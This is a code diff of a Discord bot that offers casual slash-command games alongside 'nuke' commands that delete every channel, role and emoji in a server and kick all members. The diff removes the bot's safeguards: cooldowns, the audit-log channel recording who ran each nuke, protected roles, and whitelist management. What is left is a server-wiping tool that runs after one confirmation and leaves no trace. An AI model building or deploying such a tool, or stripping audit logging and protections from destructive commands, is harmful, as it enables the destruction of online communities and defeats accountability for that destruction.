@@ -4,7 +4,6 @@ from discord import app_commands
 import asyncio
 import os
 import random
-from datetime import datetime, timedelta
 
 # ── Config ──────────────────────────────────────────────────────────────────
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
@@ -16,18 +15,6 @@ AUTHORIZED_USER_IDS = [
     933543370935128204,
 ]
 
-# Roles that cannot be deleted by nuke (add role names here)
-PROTECTED_ROLES = [
-    # "Admin",
-    # "Moderator",
-]
-
-# Audit log channel name (will be created if it doesn't exist)
-AUDIT_LOG_CHANNEL = "nuke-audit-log"
-
-# Cooldown in seconds between nuke commands per user
-COOLDOWN_SECONDS = 30
-
 # ── Bot Setup ────────────────────────────────────────────────────────────────
 intents = discord.Intents.default()
 intents.members = True
@@ -37,43 +24,6 @@ intents.message_content = True
 bot = commands.Bot(command_prefix="!", intents=intents)
 tree = bot.tree
 
-# ── Cooldown Tracking ─────────────────────────────────────────────────────────
-cooldowns = {}
-
-def is_on_cooldown(user_id):
-    if user_id in cooldowns:
-        elapsed = (datetime.utcnow() - cooldowns[user_id]).total_seconds()
-        if elapsed < COOLDOWN_SECONDS:
-            return COOLDOWN_SECONDS - elapsed
-    return 0
-
-def set_cooldown(user_id):
-    cooldowns[user_id] = datetime.utcnow()
-
-# ── Audit Log ─────────────────────────────────────────────────────────────────
-async def get_audit_channel(guild):
-    channel = discord.utils.get(guild.text_channels, name=AUDIT_LOG_CHANNEL)
-    if not channel:
-        try:
-            channel = await guild.create_text_channel(AUDIT_LOG_CHANNEL)
-        except Exception:
-            return None
-    return channel
-
-async def log_action(guild, user, command, details=""):
-    channel = await get_audit_channel(guild)
-    if not channel:
-        return
-    embed = discord.Embed(
-        title="📋 Nuke Audit Log",
-        color=discord.Color.orange(),
-        timestamp=datetime.utcnow()
-    )
-    embed.add_field(name="User", value=f"{user} ({user.id})", inline=True)
-    embed.add_field(name="Command", value=command, inline=True)
-    if details:
-        embed.add_field(name="Details", value=details, inline=False)
-    await channel.send(embed=embed)
 
 # ── Helpers ───────────────────────────────────────────────────────────────────
 async def confirm(ctx, action: str) -> bool:
@@ -103,26 +53,14 @@ async def send_result(ctx, results: list[str]):
     )
     await ctx.send(embed=embed)
 
-async def check_cooldown(ctx):
-    remaining = is_on_cooldown(ctx.author.id)
-    if remaining:
-        await ctx.send(f"⏱️ You're on cooldown! Wait **{remaining:.1f}s** before using another nuke command.")
-        return False
-    return True
-
-def is_protected_role(role):
-    return role.name in PROTECTED_ROLES
 
 # ── Nuke Commands ──────────────────────────────────────────────────────────────
 
 @bot.command(name="nuke_channels")
+
 async def nuke_channels(ctx):
-    if not await check_cooldown(ctx):
-        return
     if not await confirm(ctx, "delete ALL channels"):
         return
-    set_cooldown(ctx.author.id)
-    await log_action(ctx.guild, ctx.author, "!nuke_channels")
     guild = ctx.guild
     count = 0
     for channel in guild.channels:
@@ -140,17 +78,14 @@ async def nuke_channels(ctx):
 
 
 @bot.command(name="nuke_roles")
+
 async def nuke_roles(ctx):
-    if not await check_cooldown(ctx):
-        return
     if not await confirm(ctx, "delete all roles"):
         return
-    set_cooldown(ctx.author.id)
-    await log_action(ctx.guild, ctx.author, "!nuke_roles")
     guild = ctx.guild
     count = 0
     for role in guild.roles:
-        if role.is_default() or role.managed or is_protected_role(role):
+        if role.is_default() or role.managed:
             continue
         try:
             await role.delete(reason="Nuke: roles")
@@ -162,13 +97,10 @@ async def nuke_roles(ctx):
 
 
 @bot.command(name="nuke_channels_roles")
+
 async def nuke_channels_roles(ctx):
-    if not await check_cooldown(ctx):
-        return
     if not await confirm(ctx, "delete all channels AND roles"):
         return
-    set_cooldown(ctx.author.id)
-    await log_action(ctx.guild, ctx.author, "!nuke_channels_roles")
     guild = ctx.guild
     ch_count = role_count = 0
     for channel in list(guild.channels):
@@ -179,7 +111,7 @@ async def nuke_channels_roles(ctx):
         except (discord.Forbidden, discord.HTTPException):
             pass
     for role in list(guild.roles):
-        if role.is_default() or role.managed or is_protected_role(role):
+        if role.is_default() or role.managed:
             continue
         try:
             await role.delete(reason="Nuke: channels+roles")
@@ -195,13 +127,10 @@ async def nuke_channels_roles(ctx):
 
 
 @bot.command(name="nuke_kick")
+
 async def nuke_kick(ctx):
-    if not await check_cooldown(ctx):
-        return
     if not await confirm(ctx, "delete channels, roles, AND kick all members"):
         return
-    set_cooldown(ctx.author.id)
-    await log_action(ctx.guild, ctx.author, "!nuke_kick")
     guild = ctx.guild
     ch_count = role_count = kick_count = 0
     for channel in list(guild.channels):
@@ -212,7 +141,7 @@ async def nuke_kick(ctx):
         except (discord.Forbidden, discord.HTTPException):
             pass
     for role in list(guild.roles):
-        if role.is_default() or role.managed or is_protected_role(role):
+        if role.is_default() or role.managed:
             continue
         try:
             await role.delete(reason="Nuke: kick")
@@ -239,13 +168,10 @@ async def nuke_kick(ctx):
 
 
 @bot.command(name="nuke_full")
+
 async def nuke_full(ctx):
-    if not await check_cooldown(ctx):
-        return
     if not await confirm(ctx, "FULL RESET — channels, roles, emojis, and kick all members"):
         return
-    set_cooldown(ctx.author.id)
-    await log_action(ctx.guild, ctx.author, "!nuke_full")
     guild = ctx.guild
     ch_count = role_count = kick_count = emoji_count = 0
     for channel in list(guild.channels):
@@ -256,7 +182,7 @@ async def nuke_full(ctx):
         except (discord.Forbidden, discord.HTTPException):
             pass
     for role in list(guild.roles):
-        if role.is_default() or role.managed or is_protected_role(role):
+        if role.is_default() or role.managed:
             continue
         try:
             await role.delete(reason="Nuke: full reset")
@@ -305,84 +231,11 @@ async def nuke_help(ctx):
     await ctx.send(embed=embed)
 
 
-# ── Whitelist Commands ────────────────────────────────────────────────────────
-@bot.command(name="whitelist_add")
-async def whitelist_add(ctx, user: discord.Member):
-    if ctx.author.id not in AUTHORIZED_USER_IDS:
-        await ctx.send("🚫 Only authorized users can manage the whitelist.")
-        return
-    if user.id not in AUTHORIZED_USER_IDS:
-        AUTHORIZED_USER_IDS.append(user.id)
-        await ctx.send(f"✅ {user.mention} has been added to the whitelist.")
-        await log_action(ctx.guild, ctx.author, "!whitelist_add", f"Added {user} ({user.id})")
-    else:
-        await ctx.send(f"⚠️ {user.mention} is already on the whitelist.")
-
-@bot.command(name="whitelist_remove")
-async def whitelist_remove(ctx, user: discord.Member):
-    if ctx.author.id not in AUTHORIZED_USER_IDS:
-        await ctx.send("🚫 Only authorized users can manage the whitelist.")
-        return
-    if user.id in AUTHORIZED_USER_IDS:
-        AUTHORIZED_USER_IDS.remove(user.id)
-        await ctx.send(f"✅ {user.mention} has been removed from the whitelist.")
-        await log_action(ctx.guild, ctx.author, "!whitelist_remove", f"Removed {user} ({user.id})")
-    else:
-        await ctx.send(f"⚠️ {user.mention} is not on the whitelist.")
-
-@bot.command(name="whitelist_list")
-async def whitelist_list(ctx):
-    if ctx.author.id not in AUTHORIZED_USER_IDS:
-        await ctx.send("🚫 Only authorized users can view the whitelist.")
-        return
-    if not AUTHORIZED_USER_IDS:
-        await ctx.send("📋 The whitelist is empty.")
-        return
-    embed = discord.Embed(title="🔑 Whitelist", color=discord.Color.blue())
-    embed.description = "\n".join([f"<@{uid}>" for uid in AUTHORIZED_USER_IDS])
-    await ctx.send(embed=embed)
-
-@bot.command(name="protect_role")
-async def protect_role(ctx, *, role_name: str):
-    if ctx.author.id not in AUTHORIZED_USER_IDS:
-        await ctx.send("🚫 Only authorized users can protect roles.")
-        return
-    if role_name not in PROTECTED_ROLES:
-        PROTECTED_ROLES.append(role_name)
-        await ctx.send(f"🛡️ Role **{role_name}** is now protected from nukes.")
-        await log_action(ctx.guild, ctx.author, "!protect_role", f"Protected role: {role_name}")
-    else:
-        await ctx.send(f"⚠️ Role **{role_name}** is already protected.")
-
-@bot.command(name="unprotect_role")
-async def unprotect_role(ctx, *, role_name: str):
-    if ctx.author.id not in AUTHORIZED_USER_IDS:
-        await ctx.send("🚫 Only authorized users can unprotect roles.")
-        return
-    if role_name in PROTECTED_ROLES:
-        PROTECTED_ROLES.remove(role_name)
-        await ctx.send(f"✅ Role **{role_name}** is no longer protected.")
-        await log_action(ctx.guild, ctx.author, "!unprotect_role", f"Unprotected role: {role_name}")
-    else:
-        await ctx.send(f"⚠️ Role **{role_name}** is not protected.")
-
-@bot.command(name="protected_roles")
-async def protected_roles_list(ctx):
-    if ctx.author.id not in AUTHORIZED_USER_IDS:
-        await ctx.send("🚫 Only authorized users can view protected roles.")
-        return
-    if not PROTECTED_ROLES:
-        await ctx.send("🛡️ No roles are currently protected.")
-        return
-    embed = discord.Embed(title="🛡️ Protected Roles", color=discord.Color.green())
-    embed.description = "\n".join(PROTECTED_ROLES)
-    await ctx.send(embed=embed)
-
-
 # ══════════════════════════════════════════════════════════════════════════════
 # 🎮 SLASH COMMAND GAMES
 # ══════════════════════════════════════════════════════════════════════════════
 
+# ── 🎰 Slots ──────────────────────────────────────────────────────────────────
 @tree.command(name="slots", description="Spin the slot machine!")
 async def slots(interaction: discord.Interaction):
     symbols = ["🍒", "🍋", "🍊", "🍇", "⭐", "💎", "7️⃣"]
@@ -410,6 +263,7 @@ async def slots(interaction: discord.Interaction):
     await interaction.response.send_message(embed=embed)
 
 
+# ── 🪨 Rock Paper Scissors ────────────────────────────────────────────────────
 @tree.command(name="rps", description="Play Rock Paper Scissors!")
 @app_commands.describe(choice="Your choice: rock, paper, or scissors")
 @app_commands.choices(choice=[
@@ -441,6 +295,7 @@ async def rps(interaction: discord.Interaction, choice: str):
     await interaction.response.send_message(embed=embed)
 
 
+# ── 🎱 8 Ball ─────────────────────────────────────────────────────────────────
 @tree.command(name="8ball", description="Ask the magic 8 ball a question!")
 @app_commands.describe(question="Your yes/no question")
 async def eightball(interaction: discord.Interaction, question: str):
@@ -460,6 +315,7 @@ async def eightball(interaction: discord.Interaction, question: str):
     await interaction.response.send_message(embed=embed)
 
 
+# ── 🎲 Dice Roll ──────────────────────────────────────────────────────────────
 @tree.command(name="dice", description="Roll a dice!")
 @app_commands.describe(sides="Number of sides on the dice (default: 6)")
 async def dice(interaction: discord.Interaction, sides: int = 6):
@@ -475,6 +331,7 @@ async def dice(interaction: discord.Interaction, sides: int = 6):
     await interaction.response.send_message(embed=embed)
 
 
+# ── ❓ Trivia ─────────────────────────────────────────────────────────────────
 TRIVIA_QUESTIONS = [
     {"q": "What is the capital of France?", "a": "paris"},
     {"q": "How many sides does a hexagon have?", "a": "6"},
@@ -491,7 +348,11 @@ TRIVIA_QUESTIONS = [
 @tree.command(name="trivia", description="Answer a trivia question!")
 async def trivia(interaction: discord.Interaction):
     q = random.choice(TRIVIA_QUESTIONS)
-    embed = discord.Embed(title="❓ Trivia Time!", description=q["q"], color=discord.Color.teal())
+    embed = discord.Embed(
+        title="❓ Trivia Time!",
+        description=q["q"],
+        color=discord.Color.teal()
+    )
     embed.set_footer(text="You have 15 seconds to answer in chat!")
     await interaction.response.send_message(embed=embed)
 
@@ -508,6 +369,7 @@ async def trivia(interaction: discord.Interaction):
         await interaction.channel.send(f"⏱️ Time's up! The answer was **{q['a']}**.")
 
 
+# ── 🃏 Blackjack ──────────────────────────────────────────────────────────────
 def draw_card():
     cards = ["2", "3", "4", "5", "6", "7", "8", "9", "10", "J", "Q", "K", "A"]
     return random.choice(cards)
@@ -554,12 +416,17 @@ async def blackjack(interaction: discord.Interaction):
         if msg.content.lower() == "hit":
             player.append(draw_card())
             if hand_value(player) > 21:
-                await interaction.channel.send(f"💥 Bust! Your hand: {hand_str(player)} ({hand_value(player)}). You lose!")
+                await interaction.channel.send(
+                    f"💥 Bust! Your hand: {hand_str(player)} ({hand_value(player)}). You lose!"
+                )
                 return
-            await interaction.channel.send(f"Your hand: {hand_str(player)} (Total: {hand_value(player)})\nType 'hit' or 'stand'.")
+            await interaction.channel.send(
+                f"Your hand: {hand_str(player)} (Total: {hand_value(player)})\nType 'hit' or 'stand'."
+            )
         else:
             break
 
+    # Dealer's turn
     while hand_value(dealer) < 17:
         dealer.append(draw_card())
 
@@ -580,6 +447,7 @@ async def blackjack(interaction: discord.Interaction):
     await interaction.channel.send(embed=result_embed)
 
 
+# ── 💣 Minesweeper ────────────────────────────────────────────────────────────
 @tree.command(name="minesweeper", description="Generate a minesweeper board!")
 @app_commands.describe(size="Board size (default: 5)", mines="Number of mines (default: 5)")
 async def minesweeper(interaction: discord.Interaction, size: int = 5, mines: int = 5):
@@ -590,11 +458,13 @@ async def minesweeper(interaction: discord.Interaction, size: int = 5, mines: in
         await interaction.response.send_message("❌ Too many mines for this board size!", ephemeral=True)
         return
 
+    # Place mines
     board = [[0] * size for _ in range(size)]
     mine_positions = random.sample(range(size * size), mines)
     for pos in mine_positions:
         board[pos // size][pos % size] = -1
 
+    # Calculate numbers
     for r in range(size):
         for c in range(size):
             if board[r][c] == -1:
@@ -607,6 +477,7 @@ async def minesweeper(interaction: discord.Interaction, size: int = 5, mines: in
                         count += 1
             board[r][c] = count
 
+    # Build spoiler board
     number_emojis = ["0️⃣", "1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣"]
     rows = []
     for r in range(size):
